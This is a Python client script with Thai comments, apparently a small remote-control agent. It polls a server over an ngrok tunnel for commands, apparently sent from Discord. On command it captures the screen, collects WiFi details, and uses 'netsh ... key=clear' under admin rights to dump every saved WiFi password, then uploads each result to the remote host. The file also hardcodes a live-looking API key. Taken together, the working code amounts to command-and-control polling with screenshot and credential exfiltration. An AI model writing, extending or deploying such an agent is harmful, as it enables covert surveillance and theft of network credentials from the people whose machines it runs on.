"""
Client (รันบน PC2)
- Poll คำสั่งจาก server ผ่าน ngrok
- cap       -> จับภาพหน้าจอส่งกลับ
- wifi      -> ดึงข้อมูล WiFi ปัจจุบันส่งกลับ
- wifi-pass -> ดึงรหัส WiFi ที่เคยเชื่อมต่อส่งกลับ

หมายเหตุ: !wifi-pass ต้องรัน client ด้วยสิทธิ์ Administrator
          จึงจะเห็นรหัสของทุก profile

วิธีใช้:
    python client.py              # รัน loop รอคำสั่ง
    python client.py cap          # ยิง cap ครั้งเดียว
    python client.py wifi         # ยิง wifi ครั้งเดียว
    python client.py wifi-pass    # ยิง wifi-pass ครั้งเดียว
"""

import asyncio
import io
import sys

import aiohttp
import mss
from PIL import Image

# ==================== ตั้งค่า ====================
NGROK_URL = "https://c3b7-2405-9800-b861-43ac-59f4-dced-89d8-2853.ngrok-free.app"    # ← URL จาก ngrok
API_KEY = "18be12a48e37bcf1e70d2e0588e1db0999aef5e60ae3ba8194bb386181d341ec"        # ← ต้องตรงกับ server .env
POLL_INTERVAL = 2.0
MAX_WIFI_CHARS = 100_000
# ==================================================

API_UPLOAD = f"{NGROK_URL}/upload"
API_PENDING = f"{NGROK_URL}/pending"
API_HEALTH = f"{NGROK_URL}/health"

HEADERS = {
    "X-API-Key": API_KEY,
    "ngrok-skip-browser-warning": "true",
}


# ==================== Capture ====================

def capture_screen() -> bytes:
    """จับภาพหน้าจอหลัก (monitor[1]) แล้วคืนเป็น PNG bytes"""
    with mss.MSS() as sct:
        monitor = sct.monitors[1]
        shot = sct.grab(monitor)
        img = Image.frombytes("RGB", shot.size, shot.rgb)
        buf = io.BytesIO()
        img.save(buf, format="PNG", optimize=True)
        return buf.getvalue()


async def _run_cmd(cmd: list[str], timeout: float = 10.0) -> str:
    """รันคำสั่งแบบ async ไม่ค้าง"""
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=timeout
            )
        except asyncio.TimeoutError:
            proc.kill()
            await proc.wait()
            return f"[timeout {timeout}s] {' '.join(cmd)}"

        if proc.returncode != 0:
            return (
                f"[error {proc.returncode}] "
                f"{stderr.decode('utf-8', errors='replace')}"
            )
        return stdout.decode("utf-8", errors="replace")
    except FileNotFoundError:
        return f"[not found] {cmd[0]}"
    except Exception as e:
        return f"[exception] {e}"


# ==================== WiFi Info ====================

async def get_wifi_info_async() -> str:
    """ดึงข้อมูล WiFi ปัจจุบัน (interfaces + profiles)"""
    interfaces = await _run_cmd(["netsh", "wlan", "show", "interfaces"])
    profiles = await _run_cmd(["netsh", "wlan", "show", "profiles"])
    return f"=== Interfaces ===\n{interfaces}\n\n=== Profiles ===\n{profiles}"


async def get_wifi_profiles() -> list[str]:
    """ดึงชื่อ profiles WiFi ทั้งหมด"""
    output = await _run_cmd(["netsh", "wlan", "show", "profiles"])
    profiles = []
    for line in output.splitlines():
        # รูปแบบ: "    All User Profile     : KOK_5G"
        if "All User Profile" in line and ":" in line:
            name = line.split(":", 1)[1].strip()
            if name:
                profiles.append(name)
    return profiles


async def get_wifi_passwords_async() -> str:
    """
    ดึงชื่อ profiles ทั้งหมด แล้วขอรหัสของแต่ละอัน
    ต้องรันด้วยสิทธิ์ Administrator จึงจะเห็นรหัสทุก profile
    """
    profiles = await get_wifi_profiles()
    if not profiles:
        return "[error] ไม่พบ WiFi profile"

    lines = [f"พบ {len(profiles)} profiles:\n"]

    for name in profiles:
        # ต้องใช้ key=clear เพื่อให้เห็นรหัส
        output = await _run_cmd(
            ["netsh", "wlan", "show", "profile", f"name={name}", "key=clear"],
            timeout=8.0,
        )

        key = None
        auth = None
        for line in output.splitlines():
            s = line.strip()
            if s.startswith("Key Content"):
                key = s.split(":", 1)[1].strip() if ":" in s else "(ว่าง)"
            elif s.startswith("Authentication"):
                auth = s.split(":", 1)[1].strip() if ":" in s else "?"

        if key is None:
            key = "(ไม่มีรหัส / ไม่มีสิทธิ์อ่าน — ลองรันแบบ Admin)"
        if auth is None:
            auth = "?"

        lines.append(f"📶 {name}")
        lines.append(f"   Auth : {auth}")
        lines.append(f"   Pass : {key}")
        lines.append("")

    return "\n".join(lines)


# ==================== Send ====================

async def send_cap(session: aiohttp.ClientSession, channel_id: int) -> bool:
    print("[CLIENT] capturing screen...")
    img_bytes = await asyncio.to_thread(capture_screen)
    print(f"[CLIENT] captured {len(img_bytes)} bytes")

    data = aiohttp.FormData()
    data.add_field("channel_id", str(channel_id), content_type="text/plain")
    data.add_field("type", "cap", content_type="text/plain")
    data.add_field("image", img_bytes, filename="cap.png",
                   content_type="image/png")

    try:
        async with session.post(
            API_UPLOAD, data=data, headers=HEADERS,
            timeout=aiohttp.ClientTimeout(total=30),
        ) as r:
            text = await r.text()
            print(f"[CLIENT] upload cap -> {r.status} {text}")
            return r.status == 200
    except asyncio.TimeoutError:
        print("[CLIENT] ❌ upload cap timeout")
        return False
    except aiohttp.ClientError as e:
        print(f"[CLIENT] ❌ upload cap error: {e}")
        return False


async def send_wifi(session: aiohttp.ClientSession, channel_id: int) -> bool:
    print("[CLIENT] reading wifi info...")
    info = await get_wifi_info_async()

    if len(info) > MAX_WIFI_CHARS:
        info = info[:MAX_WIFI_CHARS] + "\n\n[... truncated ...]"

    print(f"[CLIENT] wifi info {len(info)} chars")

    data = aiohttp.FormData()
    data.add_field("channel_id", str(channel_id), content_type="text/plain")
    data.add_field("type", "wifi", content_type="text/plain")
    data.add_field("text", info, content_type="text/plain")

    try:
        async with session.post(
            API_UPLOAD, data=data, headers=HEADERS,
            timeout=aiohttp.ClientTimeout(total=30),
        ) as r:
            text = await r.text()
            print(f"[CLIENT] upload wifi -> {r.status} {text}")
            return r.status == 200
    except asyncio.TimeoutError:
        print("[CLIENT] ❌ upload wifi timeout")
        return False
    except aiohttp.ClientError as e:
        print(f"[CLIENT] ❌ upload wifi error: {e}")
        return False


async def send_wifi_pass(session: aiohttp.ClientSession, channel_id: int) -> bool:
    print("[CLIENT] reading wifi passwords...")
    info = await get_wifi_passwords_async()

    if len(info) > MAX_WIFI_CHARS:
        info = info[:MAX_WIFI_CHARS] + "\n\n[... truncated ...]"

    print(f"[CLIENT] wifi-pass info {len(info)} chars")

    data = aiohttp.FormData()
    data.add_field("channel_id", str(channel_id), content_type="text/plain")
    data.add_field("type", "wifi-pass", content_type="text/plain")
    data.add_field("text", info, content_type="text/plain")

    try:
        async with session.post(
            API_UPLOAD, data=data, headers=HEADERS,
            timeout=aiohttp.ClientTimeout(total=60),
        ) as r:
            text = await r.text()
            print(f"[CLIENT] upload wifi-pass -> {r.status} {text}")
            return r.status == 200
    except asyncio.TimeoutError:
        print("[CLIENT] ❌ upload wifi-pass timeout")
        return False
    except aiohttp.ClientError as e:
        print(f"[CLIENT] ❌ upload wifi-pass error: {e}")
        return False


# ==================== Modes ====================

async def check_health(session: aiohttp.ClientSession) -> bool:
    try:
        async with session.get(
            API_HEALTH, headers=HEADERS,
            timeout=aiohttp.ClientTimeout(total=10),
        ) as r:
            info = await r.json()
            print(f"[CLIENT] health: {info}")
            return r.status == 200
    except Exception as e:
        print(f"[CLIENT] health check failed: {e}")
        return False


async def run_loop():
    print(f"[CLIENT] polling {API_PENDING} every {POLL_INTERVAL}s")
    print("[CLIENT] กด Ctrl+C เพื่อหยุด")

    async with aiohttp.ClientSession() as session:
        ok = await check_health(session)
        if not ok:
            print("[CLIENT] ⚠️  server ไม่ตอบสนอง — ตรวจสอบ ngrok URL")

        consecutive_errors = 0
        while True:
            try:
                async with session.get(
                    API_PENDING, headers=HEADERS,
                    timeout=aiohttp.ClientTimeout(total=10),
                ) as r:
                    if r.status == 200:
                        info = await r.json()
                        consecutive_errors = 0

                        if info.get("has_task"):
                            typ = info["type"]
                            ch_id = info["channel_id"]
                            print(f"[CLIENT] 📥 task: {typ} (channel={ch_id})")

                            try:
                                if typ == "cap":
                                    await send_cap(session, ch_id)
                                elif typ == "wifi":
                                    await send_wifi(session, ch_id)
                                elif typ == "wifi-pass":
                                    await send_wifi_pass(session, ch_id)
                            except Exception as e:
                                print(f"[CLIENT] task error: {e}")
                    else:
                        body = await r.text()
                        print(f"[CLIENT] poll -> {r.status} {body[:200]}")
                        consecutive_errors += 1

            except asyncio.TimeoutError:
                consecutive_errors += 1
            except aiohttp.ClientError as e:
                print(f"[CLIENT] network error: {e}")
                consecutive_errors += 1
            except Exception as e:
                print(f"[CLIENT] unexpected error: {e}")
                consecutive_errors += 1

            delay = POLL_INTERVAL
            if consecutive_errors > 5:
                delay = min(
                    POLL_INTERVAL * (2 ** min(consecutive_errors - 5, 4)), 30
                )
                print(f"[CLIENT] backoff {delay}s (errors={consecutive_errors})")

            await asyncio.sleep(delay)


async def run_once(cmd: str):
    timeout = aiohttp.ClientTimeout(total=30)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.get(API_PENDING, headers=HEADERS) as r:
            info = await r.json()
            if not info.get("has_task"):
                print("[CLIENT] ❌ ไม่มี pending request — พิมพ์คำสั่งใน Discord ก่อน")
                return
            ch_id = info["channel_id"]
            typ = info["type"]
            if typ != cmd:
                print(f"[CLIENT] ❌ server รอ {typ} อยู่ ไม่ใช่ {cmd}")
                return

        if cmd == "cap":
            await send_cap(session, ch_id)
        elif cmd == "wifi":
            await send_wifi(session, ch_id)
        elif cmd == "wifi-pass":
            await send_wifi_pass(session, ch_id)


# ==================== Entry ====================

if __name__ == "__main__":
    cmd = sys.argv[1].lower() if len(sys.argv) > 1 else None

    try:
        if cmd in ("cap", "wifi", "wifi-pass"):
            asyncio.run(run_once(cmd))
        else:
            asyncio.run(run_loop())
    except KeyboardInterrupt:
        print("\n[CLIENT] stopped")
